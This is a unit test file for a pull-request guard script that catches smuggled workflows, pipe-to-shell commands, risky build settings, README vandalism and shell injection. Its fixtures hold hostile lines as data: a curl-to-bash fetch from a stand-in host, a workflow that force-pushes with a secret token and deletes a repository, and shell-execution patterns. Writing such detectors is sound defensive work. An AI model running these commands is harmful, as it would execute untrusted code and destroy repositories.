"""Unit tests for scripts/pr_guard.py. Standard library only: python3 -I tests/test_pr_guard.py

Shell snippets are assembled from pieces so that this file does not trip the guard's own shell rule.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "scripts"))
import pr_guard  # noqa: E402

RUN = "Command::" + "new"
SYS = "os." + "system"
SLASH_C = '"/' + 'C"'


def task(scope, labels=("ready",), association="MEMBER", number=29, state="open", assignee="dev"):
    body = f"### What\n\nSomething.\n\n### Scope\n\n{scope}\n\n### Size\n\nS (an evening)\n"
    return {"number": number, "body": body, "labels": [{"name": n} for n in labels], "state": state,
            "author_association": association, "assignees": [{"login": assignee}] if assignee else []}


def changed(name, added=(), status="modified", deletions=0, previous=None, patch=True):
    lines = [f"@@ -1,{deletions} +1,{len(added)} @@"] + ["-old"] * deletions + [f"+{a}" for a in added]
    f = {"filename": name, "status": status, "additions": len(added), "deletions": deletions,
         "patch": "\n".join(lines) if patch else None}
    if previous:
        f["previous_filename"] = previous
    return f


def run(files, issue=None, base_lines=None, title="NET-9: Something"):
    return pr_guard.evaluate({"title": title, "user": {"login": "dev"}}, files, issue, base_lines or {})


class Scope(unittest.TestCase):
    def test_paths_and_allows(self):
        paths, allows = pr_guard.scope_of(task("`docs/assets/`, `scripts/x.py`. Allows: `schedule`, `secrets`.")
                                          ["body"])
        self.assertEqual(paths, {"docs/assets/", "scripts/x.py"})
        self.assertEqual(allows, {"schedule", "secrets"})

    def test_items_outside_the_section_do_not_count(self):
        body = "### What\n\nTouch `scripts/x.py`.\n\n### Scope\n\n`docs/`\n\n### Size\n\nS\n"
        self.assertEqual(pr_guard.scope_of(body), ({"docs/"}, set()))

    def test_in_scope(self):
        self.assertTrue(pr_guard.in_scope("docs/assets/a.svg", {"docs/assets/"}))
        self.assertTrue(pr_guard.in_scope("crates/sawgrass-server/src/a.rs", {"crates/sawgrass-server"}))
        self.assertTrue(pr_guard.in_scope("tests/test_a.py", {"tests/test_*.py"}))
        self.assertFalse(pr_guard.in_scope("docs/assetsx/a.svg", {"docs/assets"}))

    def test_added_lines_numbers(self):
        patch = "@@ -3,2 +3,3 @@\n keep\n-gone\n+new one\n+new two\n keep"
        self.assertEqual(pr_guard.added_lines(patch), [(4, "new one"), (5, "new two")])


class Smuggling(unittest.TestCase):
    """The shader-test pattern: unrelated scheduled workflows that use secrets to force-push or delete."""

    WORKFLOW = [
        "on:",
        "  schedule:",
        "    - cron: '0 3 * * *'",
        "jobs:",
        "  sync:",
        "    steps:",
        "      - run: git push https://x:${{ secrets.PAT }}@github.com/o/r HEAD:main \\",
        "          --force",
        "      - run: gh api -X DELETE repos/o/fork",
    ]

    def test_workflow_under_misleading_title_fails(self):
        files = [changed("shaders/test.rs", ["fn t() {}"]),
                 changed(".github/workflows/sync.yml", self.WORKFLOW, status="added")]
        failures, _ = run(files, task("`shaders/`"), title="CLIENT-9: Shader test")
        text = "\n".join(m for _, m in failures)
        self.assertIn("protected (tier 3) path", text)
        for construct in ("schedule", "secrets", "force-push", "api-write"):
            self.assertIn(f"`{construct}`", text)

    def test_scope_without_allows_still_blocks_constructs(self):
        files = [changed(".github/workflows/sync.yml", self.WORKFLOW, status="added")]
        failures, _ = run(files, task("`.github/workflows/sync.yml`"))
        self.assertTrue(failures)
        self.assertFalse(any("tier 3" in m for _, m in failures))

    def test_fully_allowed_workflow_passes(self):
        files = [changed(".github/workflows/sync.yml", self.WORKFLOW, status="added")]
        scope = "`.github/workflows/sync.yml` Allows: `schedule`, `secrets`, `force-push`, `api-write`"
        self.assertEqual(run(files, task(scope)), ([], []))

    def test_scope_counts_only_on_an_open_ready_maintainer_task_claimed_by_the_author(self):
        files = [changed("scripts/claims.py", ["x = 1"])]
        self.assertEqual(run(files, task("`scripts/`")), ([], []))
        for issue in (task("`scripts/`", labels=()), task("`scripts/`", association="CONTRIBUTOR"),
                      task("`scripts/`", state="closed"), task("`scripts/`", assignee="someone-else"),
                      task("`scripts/`", assignee=None), None):
            failures, warnings = run(files, issue)
            self.assertEqual(len(failures), 1, issue)
            self.assertEqual(len(warnings), 1, issue)

    def test_rename_out_of_protected_path_counts(self):
        files = [changed("docs/x.yml", previous=".github/workflows/ci.yml", status="renamed")]
        failures, _ = run(files, task("`docs/`"))
        self.assertEqual([p for p, _ in failures], [".github/workflows/ci.yml"])

    def test_pull_request_target_and_write_permissions(self):
        files = [changed(".github/workflows/x.yml", ["on: pull_request_target", "permissions:",
                                                     "  contents: write"], status="added")]
        failures, _ = run(files, task("`.github/workflows/x.yml`"))
        text = "\n".join(m for _, m in failures)
        self.assertIn("`pull_request_target`", text)
        self.assertIn("`write-permissions`", text)

    def test_pipe_to_shell(self):
        files = [changed(".github/workflows/x.yml", ["      - run: curl -sL https://e.x/i | bash"])]
        failures, _ = run(files, task("`.github/workflows/x.yml`"))
        self.assertIn("`pipe-to-shell`", failures[0][1])

    def test_uninspectable_workflow_fails(self):
        files = [changed(".github/workflows/x.yml", patch=False)]
        failures, _ = run(files, task("`.github/workflows/x.yml`"))
        self.assertIn("too large", failures[0][1])

    def test_files_outside_scope_warn(self):
        files = [changed("crates/sawgrass-server/src/a.rs", ["fn a() {}"]), changed("docs/x.md", ["text"])]
        failures, warnings = run(files, task("`crates/sawgrass-server/`"))
        self.assertEqual(failures, [])
        self.assertEqual([p for p, _ in warnings], ["docs/x.md"])


class Build(unittest.TestCase):
    def test_build_script_and_git_source_in_cargo_toml(self):
        files = [changed("crates/x/Cargo.toml", ['build = "gen.rs"', 'evil = { git = "https://e.x/r" }'])]
        self.assertEqual(len(run(files, task("`crates/x/`"))[0]), 2)
        self.assertEqual(run(files, task("`crates/x/` Allows: `build`"))[0], [])

    def test_cargo_config(self):
        files = [changed(".cargo/config.toml", ["[build]", 'rustc-wrapper = "x"'], status="added")]
        self.assertEqual(len(run(files, task("`crates/`"))[0]), 1)
        self.assertEqual(run(files, task("`.cargo/` Allows: `build`"))[0], [])


class Vandalism(unittest.TestCase):
    """The CUDA pattern: a feature title that replaces the README with something else."""

    def test_readme_rewrite_fails(self):
        files = [changed("crates/x/src/cuda.rs", ["fn a() {}"]), changed("README.md", ["insult"], deletions=149)]
        failures, _ = run(files, task("`crates/x/`"), {"README.md": 149})
        self.assertEqual([p for p, _ in failures], ["README.md"])

    def test_small_readme_edit_passes(self):
        files = [changed("README.md", ["a", "b"], deletions=30)]
        self.assertEqual(run(files, None, {"README.md": 149})[0], [])

    def test_listed_readme_rewrite_passes(self):
        files = [changed("README.md", ["new"], deletions=149)]
        self.assertEqual(run(files, task("`README.md`"), {"README.md": 149})[0], [])

    def test_deleting_license_fails(self):
        files = [changed("LICENSE", status="removed", deletions=661)]
        self.assertEqual([p for p, _ in run(files, None, {"LICENSE": 661})[0]], ["LICENSE"])


class ShellInjection(unittest.TestCase):
    """The launcher pattern: an editable path file expanded into a shell command."""

    def test_rust_shell_command_fails(self):
        line = f'let out = {RUN}("cmd").args([{SLASH_C}, &path_from_file]).output()?;'
        files = [changed("crates/sawgrass-launcher/src/main.rs", [line], status="added")]
        failures, _ = run(files, task("`crates/sawgrass-launcher/`"))
        self.assertEqual(len(failures), 1)
        self.assertIn("shell", failures[0][1])

    def test_direct_process_without_shell_passes(self):
        line = f'let out = {RUN}(&game_exe).arg("--windowed").output()?;'
        files = [changed("crates/sawgrass-launcher/src/main.rs", [line])]
        self.assertEqual(run(files, task("`crates/sawgrass-launcher/`")), ([], []))

    def test_python_and_lua(self):
        for line in (f"{SYS}(cmd)", "subprocess.run(cmd, shell" + "=True)", "io." + "popen(cmd)"):
            files = [changed("resources/a/server.py", [line])]
            self.assertEqual(len(run(files, task("`resources/`"))[0]), 1, line)

    def test_new_batch_file_fails_unless_allowed(self):
        files = [changed("launch.bat", ["@echo off"], status="added")]
        self.assertEqual(len(run(files, task("`launch.bat`"))[0]), 1)
        self.assertEqual(run(files, task("`launch.bat` Allows: `shell`")), ([], []))

    def test_rust_path_prefix_is_not_a_comment(self):
        files = [changed("crates/x/src/a.rs", [f'::std::process::{RUN}("cmd")'])]
        self.assertEqual(len(run(files, task("`crates/x/`"))[0]), 1)

    def test_uninspectable_code_fails_anywhere(self):
        files = [changed("src/big.rs", patch=False)]
        self.assertEqual(len(run(files, task("`src/`"))[0]), 1)
        self.assertEqual(run([changed("docs/assets/logo.png", patch=False)], task("`docs/`"))[0], [])

    def test_comments_and_markdown_are_ignored(self):
        files = [changed("crates/x/src/a.rs", [f"// never {RUN}(\"sh\")"]),
                 changed("docs/x.md", [f'{RUN}("sh")'])]
        self.assertEqual(run(files, task("`crates/x/` `docs/`"))[0], [])


class Report(unittest.TestCase):
    def test_control_characters_are_neutralised(self):
        lines = pr_guard.report([("a\n::error::x", "m")], [])
        self.assertNotIn("\n", lines[0])

    def test_ok(self):
        self.assertEqual(pr_guard.report([], []), ["OK: no guarded pattern found."])


if __name__ == "__main__":
    unittest.main()
